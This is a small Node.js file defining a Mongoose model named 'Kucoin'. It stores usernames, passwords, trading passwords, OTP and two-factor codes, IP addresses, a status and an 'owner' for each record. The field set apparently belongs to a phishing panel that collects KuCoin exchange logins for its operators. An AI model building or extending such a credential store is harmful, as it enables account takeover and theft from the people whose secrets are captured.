const mongoose = require("mongoose");

const kucoinSchema = new mongoose.Schema({
  uniqueid: String,
  username: String,
  password: String,
  tradingPass: String,
  otp: String,
  twofactor: String,
  status: Number,
  ip: String,
  owner: String,
  timestamp: Date,
});

module.exports = mongoose.model("Kucoin", kucoinSchema);
